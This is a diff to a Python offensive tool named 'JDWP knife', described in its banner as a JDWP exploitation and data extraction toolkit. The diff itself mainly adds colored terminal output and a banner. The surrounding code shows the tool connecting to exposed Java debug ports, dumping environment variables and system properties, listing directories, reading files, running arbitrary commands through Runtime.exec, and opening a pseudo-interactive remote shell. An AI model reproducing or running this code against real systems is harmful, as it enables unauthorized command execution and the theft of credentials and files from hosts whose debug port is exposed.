@@ -30,6 +30,71 @@ except ImportError:
 __version__ = "1.0.0"
 
 ################################################################################
+# Terminal colors
+################################################################################
+def _supports_color():
+    """Check if stdout supports ANSI colors."""
+    import os
+    if os.environ.get("NO_COLOR"):
+        return False
+    if os.environ.get("FORCE_COLOR"):
+        return True
+    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()
+
+class _Colors:
+    BOLD    = "\033[1m"
+    DIM     = "\033[2m"
+    RED     = "\033[31m"
+    GREEN   = "\033[32m"
+    YELLOW  = "\033[33m"
+    BLUE    = "\033[34m"
+    MAGENTA = "\033[35m"
+    CYAN    = "\033[36m"
+    WHITE   = "\033[37m"
+    BRED    = "\033[1;31m"
+    BGREEN  = "\033[1;32m"
+    BYELLOW = "\033[1;33m"
+    BBLUE   = "\033[1;34m"
+    BCYAN   = "\033[1;36m"
+    BWHITE  = "\033[1;37m"
+    RESET   = "\033[0m"
+
+class _NoColors:
+    def __getattr__(self, name):
+        return ""
+
+C = _Colors() if _supports_color() else _NoColors()
+
+BANNER = """
+{red}     ██╗██████╗ ██╗    ██╗██████╗ {reset}
+{red}     ██║██╔══██╗██║    ██║██╔══██╗{reset}
+{red}     ██║██║  ██║██║ █╗ ██║██████╔╝{reset}
+{red}██   ██║██║  ██║██║███╗██║██╔═══╝ {reset}
+{red}╚█████╔╝██████╔╝╚███╔███╔╝██║     {reset}
+{red} ╚════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝     {cyan}knife v{ver}{reset}
+{dim}  JDWP exploitation & data extraction toolkit{reset}
+""".format(red=C.BRED, cyan=C.BCYAN, dim=C.DIM, reset=C.RESET, ver=__version__)
+
+
+def _section(title):
+    """Print a colored section header."""
+    line = C.CYAN + "=" * 70 + C.RESET
+    return "\n%s\n %s%s%s\n%s\n" % (line, C.BWHITE, title, C.RESET, line)
+
+
+def _ok(msg):
+    return "%s[+]%s %s" % (C.BGREEN, C.RESET, msg)
+
+def _info(msg):
+    return "%s[*]%s %s" % (C.BCYAN, C.RESET, msg)
+
+def _warn(msg):
+    return "%s[!]%s %s" % (C.BYELLOW, C.RESET, msg)
+
+def _err(msg):
+    return "%s[-]%s %s" % (C.BRED, C.RESET, msg)
+
+################################################################################
 # JDWP protocol constants
 ################################################################################
 HANDSHAKE               = b"JDWP-Handshake"
@@ -208,9 +273,9 @@ class JDWPClient:
         self.frameIDSize = struct.unpack(">I", buf[16:20])[0]
 
     def print_idsizes(self):
-        print("[*] ID sizes: field=%d method=%d object=%d refType=%d frame=%d" % (
+        print(_info("ID sizes: field=%d method=%d object=%d refType=%d frame=%d" % (
             self.fieldIDSize, self.methodIDSize, self.objectIDSize,
-            self.referenceTypeIDSize, self.frameIDSize))
+            self.referenceTypeIDSize, self.frameIDSize)))
 
     # ── Class/Method resolution ─────────────────────────────────────────────
 
@@ -605,7 +670,7 @@ def setup_breakpoint(jdwp, break_on):
     loc += struct.pack(">II", 0, 0)
 
     rId = jdwp.send_event(EVENT_BREAKPOINT, (MODKIND_LOCATIONONLY, loc))
-    print("[*] Breakpoint set (id=%x), waiting..." % rId)
+    print(_info("Breakpoint set (id=%x), waiting..." % rId))
     jdwp.resumevm()
 
     while True:
@@ -614,7 +679,7 @@ def setup_breakpoint(jdwp, break_on):
         if ret is not None: break
 
     rId, tId = ret
-    print("[+] Breakpoint hit, thread=%#x" % tId)
+    print(_ok("Breakpoint hit, thread=%#x" % tId))
     jdwp.clear_event(EVENT_BREAKPOINT, rId)
     return tId
 
@@ -623,28 +688,26 @@ def setup_breakpoint(jdwp, break_on):
 # --env : System.getenv()
 ################################################################################
 def do_env(jdwp, tId):
-    print("\n" + "="*70)
-    print(" ENVIRONMENT VARIABLES  [System.getenv()]")
-    print("="*70 + "\n")
+    print(_section("ENVIRONMENT VARIABLES  [System.getenv()]"))
 
     sysCls = jdwp.get_class("Ljava/lang/System;")
-    if not sysCls: return print("[-] System class not found")
+    if not sysCls: return print(_err("System class not found"))
     sid = sysCls["refTypeId"]
     jdwp.get_methods(sid)
 
     m = jdwp.find_method(sid, "getenv", "()Ljava/util/Map;")
-    if not m: return print("[-] getenv() not found")
+    if not m: return print(_err("getenv() not found"))
 
     buf = jdwp.invokestatic(sid, tId, m["methodId"])
     mapId, _, tag = jdwp.read_tagged_value(buf, 0)
-    if mapId == 0: return print("[-] getenv() returned null")
-    print("[+] Got env Map (id:%#x)" % mapId)
+    if mapId == 0: return print(_err("getenv() returned null"))
+    print(_ok("Got env Map (id:%#x)" % mapId))
 
     try:
         setId = jdwp.invoke_and_get_obj(mapId, tId, "entrySet")
         arrayId = jdwp.invoke_and_get_obj(setId, tId, "toArray", "()[Ljava/lang/Object;")
         arrLen = jdwp.array_length(arrayId)
-        print("[+] %d env variables\n" % arrLen)
+        print(_ok("%d env variables\n" % arrLen))
 
         entryIds = jdwp.read_object_array(arrayId, arrLen)
         results = []
@@ -660,8 +723,8 @@ def do_env(jdwp, tId):
         return results
 
     except Exception as e:
-        print("[!] entrySet path failed: %s" % e)
-        print("[!] Falling back to Map.toString()...\n")
+        print(_warn("entrySet path failed: %s" % e))
+        print(_warn("Falling back to Map.toString()...\n"))
 
     try:
         val = jdwp.call_tostring(mapId, tId)
@@ -673,7 +736,7 @@ def do_env(jdwp, tId):
             print(val)
         return [val]
     except Exception as e:
-        print("[-] toString() also failed: %s" % e)
+        print(_err("toString() also failed: %s" % e))
         return []
 
 
@@ -681,9 +744,7 @@ def do_env(jdwp, tId):
 # --props : System.getProperty()
 ################################################################################
 def do_props(jdwp, tId):
-    print("\n" + "="*70)
-    print(" SYSTEM PROPERTIES  [System.getProperty()]")
-    print("="*70 + "\n")
+    print(_section("SYSTEM PROPERTIES  [System.getProperty()]"))
 
     props = [
         "java.version", "java.vendor", "java.home", "java.vm.version",
@@ -702,12 +763,12 @@ def do_props(jdwp, tId):
     ]
 
     sysCls = jdwp.get_class("Ljava/lang/System;")
-    if not sysCls: return print("[-] System class not found")
+    if not sysCls: return print(_err("System class not found"))
     sid = sysCls["refTypeId"]
     jdwp.get_methods(sid)
 
     m = jdwp.find_method(sid, "getProperty", "(Ljava/lang/String;)Ljava/lang/String;")
-    if not m: return print("[-] getProperty() not found")
+    if not m: return print(_err("getProperty() not found"))
 
     results = {}
     for prop in props:
@@ -728,17 +789,15 @@ def do_props(jdwp, tId):
 # --ls PATH
 ################################################################################
 def do_ls(jdwp, tId, path):
-    print("\n" + "="*70)
-    print(" DIRECTORY LISTING  [%s]" % path)
-    print("="*70 + "\n")
+    print(_section("DIRECTORY LISTING  [%s]" % path))
 
     output = jdwp.exec_with_output(tId, "ls -1a %s" % path)
     if not output:
-        print("[-] Empty output (not a directory or access denied)")
+        print(_err("Empty output (not a directory or access denied)"))
         return []
 
     entries = output.strip().split('\n')
-    print("[+] %d entries\n" % len(entries))
+    print(_ok("%d entries\n" % len(entries)))
     for e in entries:
         print("  %s" % e)
     return entries
@@ -748,13 +807,11 @@ def do_ls(jdwp, tId, path):
 # --cat FILE
 ################################################################################
 def do_cat(jdwp, tId, path):
-    print("\n" + "="*70)
-    print(" FILE CONTENTS  [%s]" % path)
-    print("="*70 + "\n")
+    print(_section("FILE CONTENTS  [%s]" % path))
 
     output = jdwp.exec_with_output(tId, "cat %s" % path)
     if not output:
-        print("[-] Empty output (file not found or access denied)")
+        print(_err("Empty output (file not found or access denied)"))
         return
     print(output)
     return output
@@ -764,15 +821,13 @@ def do_cat(jdwp, tId, path):
 # --cmd
 ################################################################################
 def do_cmd(jdwp, tId, command):
-    print("\n" + "="*70)
-    print(" EXEC  [%s]" % command)
-    print("="*70 + "\n")
+    print(_section("EXEC  [%s]" % command))
 
     output = jdwp.exec_with_output(tId, command)
     if output:
         print(output)
     else:
-        print("[-] Empty output (command returned nothing or failed)")
+        print(_err("Empty output (command returned nothing or failed)"))
     return output
 
 
@@ -798,10 +853,10 @@ def do_all(jdwp, tId):
     do_env(jdwp, tId)
     for d in KEY_DIRS:
         try: do_ls(jdwp, tId, d)
-        except Exception as e: print("[-] ls %s: %s" % (d, e))
+        except Exception as e: print(_err("ls %s: %s" % (d, e)))
     for f in KEY_FILES:
         try: do_cat(jdwp, tId, f)
-        except Exception as e: print("[-] cat %s: %s" % (f, e))
+        except Exception as e: print(_err("cat %s: %s" % (f, e)))
 
 
 ################################################################################
@@ -942,10 +997,10 @@ def do_shell(jdwp, tId):
     """Pseudo-interactive shell over JDWP with cd/pwd support."""
     username, hostname, cwd = _resolve_prompt_info(jdwp, tId)
 
-    print("\n[*] JDWP pseudo-shell on %s@%s" % (username, hostname))
-    print("[*] Commands execute via Runtime.exec() on the target JVM")
-    print("[*] Builtins: cd, pwd, exit. No pipes or redirects.")
-    print("[*] Type 'exit' or press Ctrl-D to return\n")
+    print("\n" + _info("JDWP pseudo-shell on %s%s@%s%s" % (C.BRED, username, hostname, C.RESET)))
+    print(_info("Commands execute via Runtime.exec() on the target JVM"))
+    print(_info("Builtins: cd, pwd, exit. No pipes or redirects."))
+    print(_info("Type 'exit' or press Ctrl-D to return\n"))
 
     def make_prompt():
         display_cwd = cwd
@@ -988,14 +1043,14 @@ def do_shell(jdwp, tId):
                 if not output.endswith('\n'):
                     sys.stdout.write('\n')
         except JDWPConnectionError:
-            print("[-] Connection lost")
+            print(_err("Connection lost"))
             break
         except JDWPError as e:
-            print("[-] JDWP error: %s" % e)
+            print(_err("JDWP error: %s" % e))
         except Exception as e:
-            print("[-] Error: %s" % e)
+            print(_err("Error: %s" % e))
 
-    print("[*] Shell closed, returning...")
+    print(_info("Shell closed, returning..."))
 
 
 ################################################################################
@@ -1062,6 +1117,10 @@ examples:
 
 def main():
     parser = build_parser()
+    if len(sys.argv) == 1:
+        print(BANNER, file=sys.stderr)
+        parser.print_help(sys.stderr)
+        return 1
     args = parser.parse_args()
 
     if not any([args.env, args.props, args.ls, args.cat, args.cmd, args.all, args.shell]):
@@ -1073,16 +1132,17 @@ def main():
             logfile = open(args.output, 'w')
             sys.stdout = Tee(sys.__stdout__, logfile)
         except OSError as e:
-            print("[-] Cannot open output file: %s" % e, file=sys.stderr)
+            print(_err("Cannot open output file: %s" % e), file=sys.stderr)
             return 1
 
+    print(BANNER)
     cli = None
     retcode = 0
 
     try:
         cli = JDWPClient(args.target, args.port)
         cli.start()
-        print("[+] Connected: %s" % cli.version)
+        print(_ok("Connected: %s" % cli.version))
         cli.print_idsizes()
 
         tId = setup_breakpoint(cli, args.break_on)
@@ -1097,26 +1157,26 @@ def main():
             if args.ls:
                 for p in args.ls:
                     try: do_ls(cli, tId, p)
-                    except Exception as e: print("[-] ls %s: %s" % (p, e))
+                    except Exception as e: print(_err("ls %s: %s" % (p, e)))
             if args.cat:
                 for p in args.cat:
                     try: do_cat(cli, tId, p)
-                    except Exception as e: print("[-] cat %s: %s" % (p, e))
+                    except Exception as e: print(_err("cat %s: %s" % (p, e)))
             if args.cmd: do_cmd(cli, tId, args.cmd)
 
         cli.resumevm()
-        print("\n[+] Done. VM resumed.")
+        print("\n" + _ok("Done. VM resumed."))
 
     except KeyboardInterrupt:
-        print("\n[!] Interrupted")
+        print("\n" + _warn("Interrupted"))
     except JDWPConnectionError as e:
-        print("[-] Connection error: %s" % e, file=sys.stderr)
+        print(_err("Connection error: %s" % e), file=sys.stderr)
         retcode = 1
     except JDWPError as e:
-        print("[-] JDWP error: %s" % e, file=sys.stderr)
+        print(_err("JDWP error: %s" % e), file=sys.stderr)
         retcode = 1
     except Exception as e:
-        print("[-] Fatal: %s" % e, file=sys.stderr)
+        print(_err("Fatal: %s" % e), file=sys.stderr)
         traceback.print_exc()
         retcode = 1
     finally:
